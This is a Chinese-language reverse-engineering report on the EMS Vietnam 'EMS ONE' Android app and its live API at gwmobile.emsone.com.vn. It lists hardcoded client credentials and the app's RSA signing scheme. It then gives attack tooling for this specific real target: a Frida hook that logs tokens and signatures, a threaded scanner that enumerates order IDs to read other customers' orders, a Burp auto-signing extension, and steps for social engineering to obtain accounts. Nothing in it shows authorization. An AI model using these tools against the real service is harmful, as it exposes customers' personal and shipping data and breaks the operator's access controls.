# EMS ONE 系统深度技术分析报告

**目标应用**: `com.ems.emsone` (EMS Vietnam新移动系统)  
**分析日期**: 2025-11-03  
**API域名**: `gwmobile.emsone.com.vn`  
**状态**: ✓ API存活，完整认证机制已逆向  

---

## 1. 执行摘要

### 1.1 关键发现

1. **全新系统架构**
   - EMS Vietnam运营着**三套独立系统**：
     - `bill.ems.com.vn` - 商户后台（Laravel/PHP）
     - `ws.ems.com.vn` - 旧版移动API
     - **`gwmobile.emsone.com.vn` - 新版移动API (EMS247-Gateway)** ← 本次分析重点

2. **高安全性认证机制**
   - Client ID/Secret认证
   - Bearer Token授权
   - RSA SHA256withRSA数字签名
   - AndroidKeyStore私钥隔离

3. **潜在IDOR端点**（需Token验证）
   - `ORDER_GET_BY_SHIPPING_CODE` - 运单号查询
   - `ORDER_GET_BY_ID` - 订单ID查询
   - `ORDER_SEARCH` - 订单搜索

---

## 2. 系统架构分析

### 2.1 API基础信息

```
Base URL: https://gwmobile.emsone.com.vn
Server: Microsoft-IIS/10.0
Title: EMS247-Gateway
Endpoint: /execute (POST)
```

### 2.2 认证流程

```mermaid
graph LR
    A[客户端] -->|1. Client ID/Secret| B[/execute]
    B -->|2. 验证Client| C{Client Valid?}
    C -->|No| D[Code 98: Client không hợp lệ]
    C -->|Yes| E{验证签名}
    E -->|Invalid| F[Code 95: Chữ ký không hợp lệ]
    E -->|Valid| G{验证Token}
    G -->|Missing/Invalid| H[Code 97: Thiếu token]
    G -->|Valid| I[Code 00: 成功]
```

---

## 3. 请求格式详解

### 3.1 请求体结构 (JSON)

```json
{
  "channel": "ANDROID",
  "code": "EMPLOYEE_LOGIN_V2",
  "data": "{\"phone\":\"0123456789\",\"password\":\"test\"}",
  "signature": ""
}
```

**字段说明**：
- `channel`: 固定值 `"ANDROID"`
- `code`: API命令代码（如 `EMPLOYEE_LOGIN_V2`）
- `data`: JSON字符串化的业务数据
- `signature`: **在body中始终为空字符串**（真实签名在HTTP Header中）

### 3.2 完整HTTP Headers

```http
POST /execute HTTP/1.1
Host: gwmobile.emsone.com.vn
Content-Type: application/json; charset=utf-8
Accept: application/json
Authorization: Bearer {token}
platform: android
X-Client-ID: android_app_987654
X-Client-Secret: android_s3cr3t_uvwxzy
device_name: {device_name}
device_model: {device_model}
device_id: {device_id}
date_time: {dd-MM-yyyy HH:mm:ss}
time_zone: {timezone}
signature: {RSA_SHA256_signature}
public_key: {public_key_base64}
version: 1.1.5
```

### 3.3 关键凭证

```java
// Client认证
X-Client-ID: android_app_987654
X-Client-Secret: android_s3cr3t_uvwxzy

// 签名密钥（SHA256简单签名，已废弃？）
SIGN_KEY: "Ems@2021"

// RSA密钥存储
KeyStore: AndroidKeyStore
Alias: "my_rsa_key_alias"
Algorithm: SHA256withRSA
```

---

## 4. 签名机制分析

### 4.1 签名算法

**关键代码路径**:  
`com.ems.emsone.utils.RSAUtils.sign(String)`

**算法流程**:
```
1. 构造签名字符串 (使用 " | " 连接多个参数)
2. 从AndroidKeyStore获取私钥 (alias: "my_rsa_key_alias")
3. SHA256withRSA签名
4. Base64编码
5. 添加到HTTP Header: signature
```

**Java伪代码**:
```java
public static String sign(String data) {
    // 1. 获取私钥
    KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
    keyStore.load(null);
    PrivateKey privateKey = (PrivateKey) keyStore.getKey("my_rsa_key_alias", null);
    
    // 2. 签名
    Signature signature = Signature.getInstance("SHA256withRSA");
    signature.initSign(privateKey);
    signature.update(data.getBytes("UTF-8"));
    byte[] signedData = signature.sign();
    
    // 3. Base64编码
    return Base64.encodeToString(signedData, Base64.NO_WRAP);
}
```

### 4.2 签名数据构造

```java
// buildSignString()方法使用 " | " 连接
String signData = String.join(" | ", 
    device_id,
    device_name,
    device_model,
    date_time,
    time_zone,
    platform,
    version,
    client_id,
    token  // 如果有
);

String signature = RSAUtils.sign(signData);
```

### 4.3 公钥提取

```java
// getPublicKeyBase64()
public static String getPublicKeyBase64() {
    KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
    keyStore.load(null);
    PublicKey publicKey = keyStore.getCertificate("my_rsa_key_alias").getPublicKey();
    return Base64.encodeToString(publicKey.getEncoded(), Base64.NO_WRAP);
}
```

**公钥也需要在Header中发送**: `public_key: {base64_public_key}`

---

## 5. API命令代码清单

### 5.1 认证相关

| Code | 描述 | 需要Token |
|------|------|----------|
| `EMPLOYEE_LOGIN_V2` | 员工登录V2 | ❌ |
| `EMPLOYEE_COUNT_ACCOUNT` | 账户计数 | ❌ |
| `SHOP_REGISTER` | 商户注册 | ❌ |
| `SHOP_FORGET_PASSWORD_BY_EMAIL` | 邮箱找回密码 | ❌ |

### 5.2 订单相关（IDOR测试点）

| Code | 描述 | IDOR风险 |
|------|------|---------|
| **`ORDER_GET_BY_SHIPPING_CODE`** | 通过运单号获取订单 | ⚠️ 高 |
| **`ORDER_GET_BY_ID`** | 通过ID获取订单 | ⚠️ 高 |
| **`ORDER_DETAIL_BY_SHIPPING_CODE`** | 运单号详情 | ⚠️ 高 |
| `ORDER_SEARCH` | 订单搜索 | ⚠️ 中 |
| `ORDER_ADD` | 添加订单 | ⚠️ 中 |
| `ORDER_CANCEL_STATUS` | 取消订单状态 | ⚠️ 中 |
| `ORDER_CANCEL_TRANSPORT` | 取消运输 | ⚠️ 中 |
| `ORDER_SEND_TRANSPORT` | 发送运输 | ⚠️ 中 |
| `ORDER_BATCH_ADD` | 批量添加订单 | ⚠️ 中 |
| `ORDER_PRINT` | 打印订单 | ⚠️ 低 |
| `REQUEST_ORDER_LIST` | 请求订单列表 | ⚠️ 低 |
| `STATISTICAL_ORDER` | 订单统计 | ⚠️ 低 |

### 5.3 其他功能

```
COLLECTION_POST_OFFICE_SEARCH_LIST  - 邮局搜索
PRODUCT_UNIT_SEARCH_LIST            - 产品单位搜索
TRANSPORT_SERVICE_LIST              - 运输服务列表
WAREHOUSE_LIST                      - 仓库列表
GRAB_DELIVERY_ADD_ORDER             - Grab配送添加订单
GRAB_DELIVERY_CANCEL_ORDER          - Grab配送取消订单
GRAB_DELIVERY_DETAIL                - Grab配送详情
PICK_UP_ADDRESS_SEARCH_LIST         - 取货地址搜索
SHOP_CHANGE_PICK_UP_ADDRESS         - 更改取货地址
STATISTICAL_CASHFLOW                - 现金流统计
WAREHOUSE_EDIT                      - 编辑仓库
PRODUCT_EDIT                        - 编辑产品
```

---

## 6. 响应格式

### 6.1 标准响应

```json
{
  "Code": "00",
  "Message": "Success",
  "Data": "{...}",
  "Time": "03/11/2025 15:27:00",
  "Signature": null,
  "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

### 6.2 错误代码

| Code | Message | 说明 |
|------|---------|------|
| `95` | Chữ ký không hợp lệ | 签名不合法 |
| `97` | Thiếu token hoặc định dạng không hợp lệ | 缺少Token或格式不对 |
| `98` | Client không hợp lệ | Client认证失败 |
| `00` | Success | 成功 |
| `01` | Failed | 失败（如登录错误） |

---

## 7. 安全机制评估

### 7.1 已实施的安全措施

✅ **Client认证** - X-Client-ID/Secret验证  
✅ **Token授权** - Bearer Token（可能是JWT）  
✅ **数字签名** - RSA SHA256withRSA  
✅ **密钥隔离** - AndroidKeyStore（硬件支持）  
✅ **时间戳防重放** - date_time header  
✅ **设备指纹** - device_id, device_name, device_model  

### 7.2 潜在安全问题

⚠️ **IDOR未验证**（需实际测试）
```
风险: 如果后端仅验证Token，不验证订单归属，则：
- ORDER_GET_BY_SHIPPING_CODE 可遍历所有运单
- ORDER_GET_BY_ID 可遍历所有订单ID
```

⚠️ **Client凭证硬编码**
```java
X-Client-ID: android_app_987654      // APK中硬编码
X-Client-Secret: android_s3cr3t_uvwxzy  // APK中硬编码
```
**风险**: 任何逆向工程师都可以提取这些凭证

⚠️ **公钥动态传输**
```
Header: public_key: {base64_public_key}
```
**风险**: 如果服务器接受任意公钥，攻击者可以使用自己的RSA密钥对进行签名

⚠️ **SSL Pinning未实施**（需实际测试确认）
```java
// Utils.smali中发现：
TrustManager: Utils$1  // 自定义TrustManager
HostnameVerifier: Utils$2  // 自定义HostnameVerifier
```
**可能接受所有证书**

---

## 8. 攻击面分析

### 8.1 需Token的攻击路径

**前提**: 获取有效Token（需登录或注册）

**潜在攻击**:
1. **IDOR订单遍历**
   ```python
   for i in range(1, 1000000):
       response = api_call("ORDER_GET_BY_ID", {"orderId": str(i)}, token)
       if response['Code'] == '00':
           # 成功访问他人订单
   ```

2. **运单号枚举**
   ```python
   for code in ["EMS000001", "EMS000002", ...]:
       response = api_call("ORDER_GET_BY_SHIPPING_CODE", 
                          {"shippingCode": code}, token)
   ```

3. **订单批量操作**
   - 批量取消：`ORDER_CANCEL_STATUS`
   - 批量打印：`ORDER_PRINT`

### 8.2 无Token的攻击路径

**当前状态**: 所有API都需要Token（Code 97）

**可能的绕过**:
- ❌ 注册接口也需要Token
- ❌ 公开查询接口需要Token
- ⚠️ 可能存在未发现的公开端点

---

## 9. 技术限制

### 9.1 当前阻碍

1. **RSA私钥无法导出**
   - AndroidKeyStore私钥不可导出
   - 需要在真实Android设备/模拟器上运行APP

2. **无有效Token**
   - 登录需要有效的员工账号
   - 注册也需要Token（鸡生蛋问题）

3. **签名验证严格**
   - 每个请求都需要有效签名
   - 签名包含设备信息和时间戳

### 9.2 解决方案

**方案A**: 在Android模拟器上运行
```bash
# 1. 安装Genymotion/Android Studio AVD
# 2. 安装com.ems.emsone.apk
# 3. 使用Burp Suite/mitmproxy抓包
# 4. 提取Token和签名算法
# 5. Hook RSAUtils.sign()方法记录签名
```

**方案B**: Frida动态Hook
```javascript
Java.perform(function() {
    var RSAUtils = Java.use('com.ems.emsone.utils.RSAUtils');
    
    RSAUtils.sign.implementation = function(data) {
        var result = this.sign(data);
        console.log('[+] RSA Sign:');
        console.log('    Input: ' + data);
        console.log('    Output: ' + result);
        return result;
    };
    
    var DataStoreManager = Java.use('com.ems.emsone.datastore.DataStoreManager');
    DataStoreManager.getToken.implementation = function() {
        var token = this.getToken();
        console.log('[+] Token: ' + token);
        return token;
    };
});
```

**方案C**: 社会工程学
```
1. 联系EMS Vietnam获取测试账号
2. 通过官方渠道注册员工账号
3. 使用已知的商户账号尝试移动端登录
```

---

## 10. 漏洞利用工具（理论）

### 10.1 自动化IDOR扫描器

```python
#!/usr/bin/env python3
"""
EMSONE IDOR Scanner (需有效Token和签名能力)
"""

import requests
import json
from concurrent.futures import ThreadPoolExecutor

class EMSONEScanner:
    def __init__(self, token, sign_function):
        self.base_url = "https://gwmobile.emsone.com.vn"
        self.token = token
        self.sign_function = sign_function  # RSA签名函数（需Android环境）
        
    def build_headers(self, signature, public_key):
        return {
            'Content-Type': 'application/json; charset=utf-8',
            'Accept': 'application/json',
            'Authorization': f'Bearer {self.token}',
            'platform': 'android',
            'X-Client-ID': 'android_app_987654',
            'X-Client-Secret': 'android_s3cr3t_uvwxzy',
            'device_name': 'Scanner',
            'device_model': 'Test',
            'device_id': 'scanner_001',
            'date_time': '03-11-2025 15:30:00',
            'time_zone': 'GMT+07:00',
            'signature': signature,
            'public_key': public_key,
            'version': '1.1.5',
        }
    
    def test_idor_by_id(self, order_id):
        data = {
            "channel": "ANDROID",
            "code": "ORDER_GET_BY_ID",
            "data": json.dumps({"orderId": str(order_id)}),
            "signature": ""
        }
        
        # 构造签名（需Android环境）
        sign_data = self._build_sign_string(data)
        signature, public_key = self.sign_function(sign_data)
        
        headers = self.build_headers(signature, public_key)
        
        r = requests.post(
            f"{self.base_url}/execute",
            json=data,
            headers=headers,
            verify=False
        )
        
        return r.json()
    
    def mass_scan(self, start_id, end_id, threads=10):
        results = []
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(self.test_idor_by_id, i)
                for i in range(start_id, end_id)
            ]
            
            for future in futures:
                result = future.result()
                if result.get('Code') == '00':
                    print(f"[+] Found accessible order: {result}")
                    results.append(result)
        
        return results

# 使用示例（需在Android环境中运行）
# scanner = EMSONEScanner(token="...", sign_function=android_rsa_sign)
# results = scanner.mass_scan(1, 10000)
```

### 10.2 Burp Suite插件

```python
# Burp Extension: EMSONE Signer
# 自动为每个请求添加正确的Headers和签名

from burp import IBurpExtender, IHttpListener
import json

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("EMSONE Auto Signer")
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
        
        request = messageInfo.getRequest()
        requestInfo = self._helpers.analyzeRequest(request)
        
        # 检测是否是EMSONE API
        if "gwmobile.emsone.com.vn" not in str(requestInfo.getUrl()):
            return
        
        # 添加/更新Headers
        headers = list(requestInfo.getHeaders())
        
        # 移除现有的签名相关headers
        headers = [h for h in headers if not h.startswith(('signature:', 'public_key:'))]
        
        # 调用Android签名服务（需单独运行）
        signature, public_key = self.get_signature_from_android_service()
        
        # 添加新headers
        headers.append(f"signature: {signature}")
        headers.append(f"public_key: {public_key}")
        headers.append("X-Client-ID: android_app_987654")
        headers.append("X-Client-Secret: android_s3cr3t_uvwxzy")
        
        # 重建请求
        body = request[requestInfo.getBodyOffset():]
        newRequest = self._helpers.buildHttpMessage(headers, body)
        messageInfo.setRequest(newRequest)
```

---

## 11. 对比分析：三套系统

| 特性 | bill.ems.com.vn | ws.ems.com.vn | gwmobile.emsone.com.vn |
|------|----------------|---------------|------------------------|
| 类型 | 商户Web后台 | 旧版移动API | 新版移动API |
| 服务器 | Nginx+Laravel(PHP) | 未知 | Microsoft-IIS |
| 认证 | Session+CSRF | Bearer Token | Client ID+Token+RSA |
| 签名 | reCAPTCHA | 无/简单 | RSA SHA256withRSA |
| API格式 | RESTful | RESTful | 统一/execute端点 |
| 已确认漏洞 | API Key暴露、reCAPTCHA绕过 | Token失效 | 未测试（需Token） |
| 安全等级 | ⚠️ 中 | ⚠️ 低 | ✅ 高 |

---

## 12. 建议的下一步行动

### 12.1 立即可行

1. ✅ **社会工程学获取测试账号**
   - 联系EMS Vietnam客服
   - 申请商户测试账号
   - 使用已知的difoco账号尝试移动端

2. ✅ **Android环境搭建**
   ```bash
   # 1. 安装Genymotion（推荐）或Android Studio AVD
   # 2. 创建Android 10+ 虚拟机
   # 3. 安装/workspace/emsone_extracted/com.ems.emsone.apk
   # 4. 配置Burp Suite代理
   # 5. 安装Burp CA证书到设备
   ```

3. ✅ **Frida动态分析**
   ```bash
   # 安装Frida Server到设备
   adb push frida-server /data/local/tmp/
   adb shell "chmod 755 /data/local/tmp/frida-server"
   adb shell "/data/local/tmp/frida-server &"
   
   # Hook关键方法
   frida -U -f com.ems.emsone -l hook_emsone.js
   ```

### 12.2 验证IDOR

一旦获得有效Token：

```python
# 1. 测试单个IDOR
python3 test_idor_single.py --token {token} --order-id 12345

# 2. 批量扫描
python3 idor_scanner.py --token {token} --start 1 --end 100000

# 3. 实时监控
python3 monitor_orders.py --token {token} --watch
```

### 12.3 撰写漏洞报告

如果确认IDOR：

```markdown
# Title: EMS ONE Mobile API - IDOR允许未授权访问任意订单

## Summary
gwmobile.emsone.com.vn的ORDER_GET_BY_ID等端点存在IDOR漏洞，
已认证用户可以通过枚举orderId访问其他用户的订单信息。

## Affected Endpoints
- ORDER_GET_BY_ID
- ORDER_GET_BY_SHIPPING_CODE
- ORDER_DETAIL_BY_SHIPPING_CODE

## Impact
- 数据泄露：订单详情、收发件人信息、地址、电话
- 隐私侵犯：大规模用户数据暴露
- 商业机密：竞争对手可获取物流数据

## Proof of Concept
[附上实际请求和响应]

## Remediation
在后端验证订单归属...
```

---

## 13. 工具和代码清单

### 13.1 已生成的工具

```bash
/workspace/
├── test_emsone_api.py           # EMSONE API测试工具
├── emsone_extracted/            # XAPK解压目录
│   └── com.ems.emsone.apk      # 主APK文件 (29.5MB)
├── EMSONE_TECHNICAL_REPORT.md   # 本报告
└── [待创建]
    ├── hook_emsone.js           # Frida Hook脚本
    ├── idor_scanner.py          # IDOR扫描器
    └── burp_emsone_signer.py    # Burp插件
```

### 13.2 远程服务器上的反编译文件

```bash
/tmp/
└── emsone_apktool/              # apktool反编译输出
    ├── AndroidManifest.xml
    ├── smali/                   # DEX反编译smali代码
    │   └── com/ems/emsone/
    │       ├── constain/Constants.smali
    │       ├── login/LoginActivity.smali
    │       ├── utils/RSAUtils.smali
    │       └── netword/NetWorkController.smali
    └── res/                     # 资源文件
```

---

## 14. 技术术语表

| 术语 | 解释 |
|------|------|
| IDOR | Insecure Direct Object Reference - 不安全的直接对象引用 |
| AndroidKeyStore | Android系统级密钥存储，支持硬件安全模块 |
| RSA SHA256withRSA | RSA签名算法，使用SHA256作为Hash函数 |
| Bearer Token | OAuth 2.0授权框架中的访问令牌格式 |
| smali | DEX字节码的汇编语言表示 |
| apktool | Android APK反编译/重新打包工具 |
| jadx | Android DEX反编译器，生成Java源码 |
| Frida | 动态插桩框架，用于运行时Hook |

---

## 15. 参考资料

### 15.1 反编译工具

- apktool: https://ibotpeaches.github.io/Apktool/
- jadx: https://github.com/skylot/jadx
- Frida: https://frida.re/

### 15.2 Android安全

- AndroidKeyStore: https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec
- RSA签名: https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html

### 15.3 IDOR漏洞

- OWASP IDOR: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
- HackerOne IDOR Reports: https://hackerone.com/reports?subject=user&report_type=vulnerability&weakness_name=Insecure%20Direct%20Object%20References%20%28IDOR%29

---

## 附录A：完整API命令代码列表（提取自smali）

```
EMPLOYEE_LOGIN_V2
EMPLOYEE_COUNT_ACCOUNT
EMPLOYEE_CHECK_CONDITION
SHOP_REGISTER
SHOP_FORGET_PASSWORD_BY_EMAIL
SHOP_CHANGE_PICK_UP_ADDRESS
ORDER_GET_BY_ID
ORDER_GET_BY_SHIPPING_CODE
ORDER_DETAIL_BY_SHIPPING_CODE
ORDER_SEARCH
ORDER_ADD
ORDER_ADD_AND_SEND_TRANSPORT
ORDER_BATCH_ADD
ORDER_CANCEL_STATUS
ORDER_CANCEL_TRANSPORT
ORDER_SEND_TRANSPORT
ORDER_PRINT
ORDER_SEARCH_INFO_SEND_REQUEST_TRANSPORT
ORDER_SEARCH_PRODUCT
REQUEST_ORDER_ADD
REQUEST_ORDER_LIST
REQUEST_SUPPORT_DETAIL
STATISTICAL_ORDER
STATISTICAL_REQUEST_ORDER
STATISTICAL_CASHFLOW
COLLECTION_POST_OFFICE_SEARCH_LIST
PICK_UP_ADDRESS_SEARCH_LIST
PRODUCT_UNIT_SEARCH_LIST
PRODUCT_OPTION_GET_BY_PRODUCT_ID
PRODUCT_EDIT
PRODUCT_EDIT_IMAGES
TRANSPORT_SERVICE_LIST
TRANSPORT_ORDER_UPDATE_STATUS
WAREHOUSE_LIST
WAREHOUSE_EDIT
GRAB_DELIVERY_ADD_ORDER
GRAB_DELIVERY_CANCEL_ORDER
GRAB_DELIVERY_DETAIL
```

---

## 附录B：错误消息翻译

| 越南语 | 中文 | 英文 |
|--------|------|------|
| Client không hợp lệ | 客户端不合法 | Invalid client |
| Chữ ký không hợp lệ | 签名不合法 | Invalid signature |
| Thiếu token hoặc định dạng không hợp lệ | 缺少token或格式不对 | Missing or invalid token |
| Số điện thoại hoặc mật khẩu không chính xác | 电话或密码不正确 | Invalid phone or password |
| Lỗi xác thực tới máy chủ | 服务器认证错误 | Server authentication error |
| Vui lòng kiểm tra lại kết nối mạng | 请检查网络连接 | Please check network connection |

---

**报告结束**

**下一步**: 在Android模拟器上运行APP，使用Frida Hook提取Token和签名，验证IDOR漏洞。
